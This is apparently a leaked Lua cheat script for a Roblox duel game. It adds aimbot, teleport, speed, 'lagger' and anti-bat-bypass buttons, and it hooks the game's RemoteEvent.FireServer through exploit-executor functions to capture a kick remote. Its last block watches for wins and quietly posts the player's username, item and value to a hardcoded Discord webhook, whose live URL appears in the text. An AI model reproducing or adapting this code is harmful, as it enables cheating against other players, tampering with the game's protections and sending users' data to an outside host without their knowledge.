if _G.SoundToggleSelectedAimbot then _G.SoundToggleSelectedAimbot() end
task.delay(0.03, function()
setActive(btn, _G.SoundNormalAimbotOn == true)
end)
end)

makeButton("autoRight", "AUTO\nRIGHT", defaults.autoRight, function()
if _G.SoundSetAutoRight then _G.SoundSetAutoRight(not autoRightEnabled) end
end)

makeButton("laggerNormal", "LAGGER\nNORM", defaults.laggerNormal, function(btn)
if toggleLaggerMode then toggleLaggerMode() end
task.delay(0.03,function()
setActive(btn, laggerModeEnabled == true)
end)
end)

makeButton("laggerCarry", "LAGGER\nCARRY", defaults.laggerCarry, function(btn)
if toggleLaggerCarryMode then toggleLaggerCarryMode() end
task.delay(0.03, function()
setActive(btn, laggerCarryActive == true)
end)
end)

makeButton("tp", "TP DOWN", defaults.tp, function(btn)
if runTPFloor then runTPFloor() end
pulse(btn)
end)

makeButton("carry", "CARRY\nSPEED", defaults.carry, function()
if toggleCarryMode then toggleCarryMode() end
end)

makeButton("tpBat", "TP\nBAT", defaults.tpBat, function(btn)
    if _G.SoundToggleTpBat then _G.SoundToggleTpBat() end
    task.delay(0.03, function()
        if btn and btn.Parent then
            setActive(btn, _G.SoundTpBatEnabled == true)
        end
    end)
end)

makeButton("batV2", "BAT\nV2", defaults.batV2, function(btn)
    if _G.SoundToggleBatV2 then _G.SoundToggleBatV2() end
    task.delay(0.03, function()
        if btn and btn.Parent then
            setActive(btn, antiBatBypassEnabled == true)
        end
    end)
end)



makeButton("instantReset", "INSTANT\nRESET", defaults.instantReset, function(btn)
    instaResetRun()
    pulse(btn)
end)

pcall(function() if _G.SoundApplyMobileButtonImage then _G.SoundApplyMobileButtonImage() end end)

_G.SoundApplyMobileButtonSize()
_G.SoundApplyMobileButtonsHidden()
_G.SoundApplyMobileButtonVisibility()

task.defer(function()
    task.wait(0.15)
    if mobileGui then
        mobileGui.Enabled = not (_G.SoundHideMobileButtons == true)
    end
    pcall(_G.SoundApplyMobileButtonsHidden)
end)

RunService.Heartbeat:Connect(function()
if mobileButtons.autoLeft then mobileButtons.autoLeft.setActive(autoLeftEnabled == true) end
if mobileButtons.autoRight then mobileButtons.autoRight.setActive(autoRightEnabled == true) end
if mobileButtons.aimbot then mobileButtons.aimbot.setActive(_G.SoundNormalAimbotOn == true) end
if mobileButtons.carry then mobileButtons.carry.setActive(carrySpeedActive == true) end
if mobileButtons.laggerNormal then mobileButtons.laggerNormal.setActive(laggerModeEnabled == true) end
if mobileButtons.laggerCarry then mobileButtons.laggerCarry.setActive(laggerCarryActive == true) end
if mobileButtons.tpBat then mobileButtons.tpBat.setActive(_G.SoundTpBatEnabled == true) end
if mobileButtons.batV2 then mobileButtons.batV2.setActive(antiBatBypassEnabled == true) end
end)
end)


task.defer(function()
task.wait(1)
pcall(function()
_G.SoundApplyMovingEdgeLights(PlayerGui)
end)
end)

--Leaked By Xlu0 AndPrime--
pcall(function()
if hookfunction and newcclosure then
local _xKickRemote = nil
local _xOldFire
_xOldFire = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
if not _xKickRemote and typeof(self) == "Instance" and self:IsA("RemoteEvent") and self.Name:sub(1,3) == "RE/" then
_xKickRemote = self
end
return _xOldFire(self, ...)
end))
end
end)

-- ============================================
-- [PING SPIKE ALERT] (dari BlueX)
-- ============================================
pcall(function()
-- [HIGH PING ALERT]
task.spawn(function()
	local env = (getgenv and getgenv()) or _G
	env.__BLESS_HIGH_PING_RUN = (env.__BLESS_HIGH_PING_RUN or 0) + 1
	local thisRun = env.__BLESS_HIGH_PING_RUN
	env.__BLESS_INTRO_FINISHED_RUN = 0
	local function getPingMilliseconds()
		local ok, value = pcall(function()
			local stats = game:GetService("Stats")
			local network = stats:FindFirstChild("Network")
			local serverStats = network and network:FindFirstChild("ServerStatsItem")
			local pingItem = serverStats and (
				serverStats:FindFirstChild("Data Ping") or
				serverStats:FindFirstChild("Ping")
			)
			if not pingItem then return nil end
			local numericValue
			pcall(function() numericValue = pingItem:GetValue() end)
			if type(numericValue) == "number" then return numericValue end
			local valueString = pingItem:GetValueString()
			return tonumber(tostring(valueString):match("[%d%.]+"))
		end)
		return ok and tonumber(value) or nil
	end

	local function showHighPingAlert()
		local TweenService = game:GetService("TweenService")
		local CoreGui = game:GetService("CoreGui")
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local playerGui = player and player:FindFirstChildOfClass("PlayerGui")

		pcall(function()
			local old = CoreGui:FindFirstChild("BlessHighPingAlert")
			if old then old:Destroy() end
		end)
		pcall(function()
			local old = playerGui and playerGui:FindFirstChild("BlessHighPingAlert")
			if old then old:Destroy() end
		end)

		local gui = Instance.new("ScreenGui")
		gui.Name = "BlessHighPingAlert"
		gui.ResetOnSpawn = false
		gui.IgnoreGuiInset = true
		gui.DisplayOrder = 10000
		gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		local parented = pcall(function() gui.Parent = CoreGui end)
		if not parented or not gui.Parent then gui.Parent = playerGui end
		if not gui.Parent then gui:Destroy() return end

		-- Banner merah: badge "!" + teks tunggal (ASCII saja, tanpa emoji / simbol
		-- yang tidak ada di font, supaya tidak jadi huruf acak-acakan)
		local bar = Instance.new("Frame")
		bar.Name = "AlertBar"
		bar.AnchorPoint = Vector2.new(0.5, 0)
		bar.Position = UDim2.new(0.5, 0, 0, -70)
		bar.Size = UDim2.new(0.92, 0, 0, 44)
		bar.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
		bar.BorderSizePixel = 0
		bar.ClipsDescendants = true
		bar.Parent = gui

		local barSize = Instance.new("UISizeConstraint")
		barSize.MinSize = Vector2.new(240, 44)
		barSize.MaxSize = Vector2.new(380, 44)
		barSize.Parent = bar

		local barCorner = Instance.new("UICorner")
		barCorner.CornerRadius = UDim.new(0, 10)
		barCorner.Parent = bar

		local barStroke = Instance.new("UIStroke")
		barStroke.Color = Color3.fromRGB(255, 100, 100)
		barStroke.Transparency = 0.5
		barStroke.Thickness = 1
		barStroke.Parent = bar

		local badge = Instance.new("Frame")
		badge.Name = "Badge"
		badge.Size = UDim2.new(0, 26, 0, 26)
		badge.Position = UDim2.new(0, 10, 0.5, -13)
		badge.BackgroundColor3 = Color3.fromRGB(255, 220, 50)
		badge.BorderSizePixel = 0
		badge.Parent = bar
		local badgeCorner = Instance.new("UICorner")
		badgeCorner.CornerRadius = UDim.new(1, 0)
		badgeCorner.Parent = badge

		local badgeLbl = Instance.new("TextLabel")
		badgeLbl.BackgroundTransparency = 1
		badgeLbl.Size = UDim2.new(1, 0, 1, 0)
		badgeLbl.Font = Enum.Font.GothamBlack
		badgeLbl.TextSize = 18
		badgeLbl.TextColor3 = Color3.fromRGB(120, 20, 20)
		badgeLbl.Text = "!"
		badgeLbl.Parent = badge

		local mainLbl = Instance.new("TextLabel")
		mainLbl.Name = "MainText"
		mainLbl.BackgroundTransparency = 1
		mainLbl.Position = UDim2.new(0, 46, 0, 0)
		mainLbl.Size = UDim2.new(1, -56, 1, 0)
		mainLbl.Font = Enum.Font.GothamBlack
		mainLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
		mainLbl.TextXAlignment = Enum.TextXAlignment.Left
		mainLbl.TextYAlignment = Enum.TextYAlignment.Center
		mainLbl.TextScaled = false
		mainLbl.TextSize = 20
		mainLbl.TextWrapped = false
		mainLbl.Text = "MORE THAN 120 PING DONT DUEL"
		mainLbl.Parent = bar

		local slideIn = TweenService:Create(
			bar,
			TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
			{ Position = UDim2.new(0.5, 0, 0, 6) }
		)
		slideIn:Play()
		slideIn.Completed:Wait()

		task.wait(3)

		local slideOut = TweenService:Create(
			bar,
			TweenInfo.new(0.30, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
			{ Position = UDim2.new(0.5, 0, 0, -70) }
		)
		slideOut:Play()
		slideOut.Completed:Wait()

		gui:Destroy()
	end

	task.wait(5)

	local _alertRunning = false
	while env.__BLESS_HIGH_PING_RUN == thisRun do
		local ping = getPingMilliseconds()
		local highPing = (ping and ping > 150) or (ping == nil)
		if highPing and not _alertRunning then
			_alertRunning = true
			task.spawn(function()
				showHighPingAlert()
				_alertRunning = false
			end)
		end
		task.wait(14)
	end
end)
end)

-- ============================================
-- [E01 COUNTDOWN] DONT COLECT / COLECT NOW (dari BlueX)
-- ============================================
pcall(function()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local env = (getgenv and getgenv()) or _G
env.__E01_PILL_RUN = (env.__E01_PILL_RUN or 0) + 1
local myRun = env.__E01_PILL_RUN

local wasCarrying = false
local activeGui, activeConn, activeToken = nil, nil, 0

-- Teks & durasi (ubah di sini)
local DURATION   = 3.0
local TEXT_WAIT  = "\u{26A0}\u{FE0F} DONT COLECT \u{26A0}\u{FE0F}"
local TEXT_READY = "\u{2713} COLECT NOW \u{2713}"
local RED   = Color3.fromRGB(150, 14, 28)
local GREEN = Color3.fromRGB(34, 184, 80)

-- 1. Cek apakah player sedang bawa item
local function isCarrying()
    local char = LocalPlayer.Character
    if not char then return false end

    for _, child in pairs(char:GetChildren()) do
        local name = child.Name:lower()
        if name:find("brainrot") or name:find("brain") or name:find("animal") or
           name:find("carry") or name:find("stolen") or name:find("held") or name:find("steal") then
            return true
        end
    end

    for attrName, attrValue in pairs(char:GetAttributes()) do
        local name = attrName:lower()
        if (name:find("carrying") or name:find("carry") or name:find("stealing") or
            name:find("isstealing") or name:find("hasbrainrot")) and attrValue == true then
            return true
        end
    end

    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.WalkSpeed > 0 and humanoid.WalkSpeed <= 25 and humanoid.WalkSpeed ~= 16 then
        return true
    end

    return false
end

-- 2. Pill countdown (merah -> terisi hijau dari kiri -> hijau penuh)
local function startE01Countdown()
    activeToken += 1
    local token = activeToken
    if activeConn then activeConn:Disconnect() activeConn = nil end
    if activeGui then activeGui:Destroy() activeGui = nil end

    local gui = Instance.new("ScreenGui")
    gui.Name = "E01CountdownPill"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 90
    local parented = false
    if gethui then parented = pcall(function() gui.Parent = gethui() end) end
    if not parented then parented = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
    if not parented then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
    activeGui = gui

    local SHOW_POS = UDim2.new(0.5, -190, 0, 20)
    local HIDE_POS = UDim2.new(0.5, -190, 0, -80)

    local pill = Instance.new("Frame", gui)
    pill.Size = UDim2.new(0, 380, 0, 46)
    pill.Position = HIDE_POS
    pill.BackgroundColor3 = RED
    pill.BorderSizePixel = 0
    pill.ClipsDescendants = true
    Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 12)

    local fill = Instance.new("Frame", pill)
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = GREEN
    fill.BorderSizePixel = 0
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 12)

    local label = Instance.new("TextLabel", pill)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = TEXT_WAIT
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.GothamBlack
    label.TextSize = 18
    label.ZIndex = 2

    TweenService:Create(pill, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Position = SHOW_POS }):Play()

    local startTime = tick()
    local finished = false

    activeConn = RunService.RenderStepped:Connect(function()
        if finished or not pill.Parent then return end
        local progress = math.clamp((tick() - startTime) / DURATION, 0, 1)
        fill.Size = UDim2.new(progress, 0, 1, 0)

        if progress >= 1 then
            finished = true
            activeConn:Disconnect()
            activeConn = nil
            label.Text = TEXT_READY

            task.delay(2, function()
                if token ~= activeToken or not pill.Parent then return end
                local out = TweenService:Create(pill,
                    TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                    { Position = HIDE_POS })
                out:Play()
                out.Completed:Connect(function()
                    if gui.Parent then gui:Destroy() end
                    if activeGui == gui then activeGui = nil end
                end)
            end)
        end
    end)
end

-- 3. Deteksi otomatis
task.spawn(function()
    while task.wait(0.1) and env.__E01_PILL_RUN == myRun do
        local currentlyCarrying = isCarrying()
        if not wasCarrying and currentlyCarrying then
            startE01Countdown()
        end
        wasCarrying = currentlyCarrying
    end
end)

end)


--==================================================
-- WIN WEBHOOK SYSTEM - Sound Duels 1x2
-- Détecte les victoires et envoie les infos au webhook
--==================================================

task.spawn(function()
    local env = (getgenv and getgenv()) or _G
    if env.__SOUND_WIN_WEBHOOK_ACTIVE then return end
    env.__SOUND_WIN_WEBHOOK_ACTIVE = true

    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local Workspace = game:GetService("Workspace")
    local LP = Players.LocalPlayer
    if not LP then
        env.__SOUND_WIN_WEBHOOK_ACTIVE = nil
        return
    end

    -- Remplace ce webhook par un nouveau si l'ancien a été partagé.
    local HOOK_URL = "https://discord.com/api/webhooks/1553163532298756217/9JB33SC9F3Q0pC3oNhHD0l4ihX0Ekv-u_jRkQ5o1vQ1j0-12m2PiNGvUPEpT5SPGQiS4"
    local lastWin = 0
    local COOLDOWN = 5
    local req = (syn and syn.request)
        or (http and http.request)
        or (fluxus and fluxus.request)
        or http_request
        or request

    local function stripTags(t)
        return t and t:gsub("<[^>]+>", "") or ""
    end

    local function short(n)
        if n >= 1e12 then return string.format("%.1fT", n / 1e12)
        elseif n >= 1e9 then return string.format("%.1fB", n / 1e9)
        elseif n >= 1e6 then return string.format("%.1fM", n / 1e6)
        elseif n >= 1e3 then return string.format("%.1fK", n / 1e3)
        end
        return tostring(math.floor(n))
    end

    local function num(v)
        v = tostring(v or ""):gsub("%s", "")
        local n, suffix = v:match("([%d%.]+)(%a?)")
        n = tonumber(n) or 0
        if suffix == "K" or suffix == "k" then n = n * 1e3
        elseif suffix == "M" or suffix == "m" then n = n * 1e6
        elseif suffix == "B" or suffix == "b" then n = n * 1e9
        elseif suffix == "T" or suffix == "t" then n = n * 1e12 end
        return n
    end

    local function getBrainrot()
        local p3 = Vector3.new(-476.752, 10.464, 7.107)
        local p7 = Vector3.new(-476.752, 10.464, 114.107)
        local mine
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Name == "PlotSign" then
                local d3 = (v.Position - p3).Magnitude
                local d7 = (v.Position - p7).Magnitude
                if d3 < 5 or d7 < 5 then
                    for _, x in ipairs(v:GetDescendants()) do
                        if x:IsA("TextLabel") and x.Text ~= "" then
                            local labelText = stripTags(x.Text)
                            if labelText:find(LP.Name, 1, true) or labelText:find(LP.DisplayName, 1, true) then
                                mine = d3 < 5 and 3 or 7
                            end
                        end
                    end
                end
            end
        end
        if not mine then return "Unknown", "N/A" end

        local targetPos = mine == 3 and p7 or p3
        local debris = Workspace:FindFirstChild("Debris")
        if not debris then return "Unknown", "N/A" end
        local best, bestVal
        for _, v in ipairs(debris:GetChildren()) do
            if v.Name == "FastOverheadTemplate" then
                local sg = v:FindFirstChildOfClass("SurfaceGui")
                if sg and sg.Adornee and sg.Adornee:IsA("BasePart") and (sg.Adornee.Position - targetPos).Magnitude <= 50 then
                    local gen = sg:FindFirstChild("Generation", true)
                    if gen and gen:IsA("TextLabel") then
                        local val = num(stripTags(gen.Text))
                        if not bestVal or val > bestVal then
                            bestVal = val
                            local dn = sg:FindFirstChild("DisplayName", true)
                            best = dn and dn:IsA("TextLabel") and stripTags(dn.Text) or v.Name
                        end
                    end
                end
            end
        end
        return best or "Unknown", bestVal and short(bestVal) or "N/A"
    end

    local function sendWebhook(brainrot, value)
        if type(req) ~= "function" then
            warn("[Sound Duels 1x2] No HTTP request function available.")
            return
        end
        local function safeText(v)
            return tostring(v or "Unknown"):gsub("`", "'"):sub(1, 900)
        end
        local body = HttpService:JSONEncode({
            embeds = {{
                title = "🎉 SOUND DUELS 🎉",
                description = "```SOMEONE WON WHITE SOUNDD```",
                color = 0x8B5CF6,
                fields = {
                    { name = "🧠 Brainrot", value = "```" .. safeText(brainrot) .. "```", inline = true },
                    { name = "💰 Value", value = "```" .. safeText(value) .. "```", inline = true },
                    { name = "👤 Player", value = "```" .. safeText(LP.Name) .. "```", inline = true }
                },
                footer = { text = "Sound Duels 1x2 💰 | " .. os.date("%H:%M:%S") },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
        local ok, err = pcall(function()
            req({
                Url = HOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
        end)
        if not ok then warn("[Sound Duels 1x2] Webhook failed: " .. tostring(err)) end
    end

    local function onWin()
        local now = os.clock()
        if now - lastWin < COOLDOWN then return end
        lastWin = now
        print("[Sound Duels 1x2] WIN DETECTED!")
        local brainrot, value = getBrainrot()
        print(string.format("[Sound Duels 1x2] %s | %s", brainrot, value))
        sendWebhook(brainrot, value)
    end

    local function scan(obj)
        if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
        local clean = stripTags(obj.Text):lower()
        if clean:find(LP.Name:lower(), 1, true) and clean:find("won the duel", 1, true) then
            onWin()
        end
    end

    local pg = LP:WaitForChild("PlayerGui", 10)
    if not pg then
        env.__SOUND_WIN_WEBHOOK_ACTIVE = nil
        return
    end
    local connected = setmetatable({}, { __mode = "k" })
    local function attach(obj)
        scan(obj)
        if connected[obj] then return end
        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
            connected[obj] = true
            obj:GetPropertyChangedSignal("Text"):Connect(function() scan(obj) end)
        end
    end
    for _, obj in ipairs(pg:GetDescendants()) do attach(obj) end
    pg.DescendantAdded:Connect(attach)
    print("[Sound Duels 1x2] Webhook system loaded!")
end)
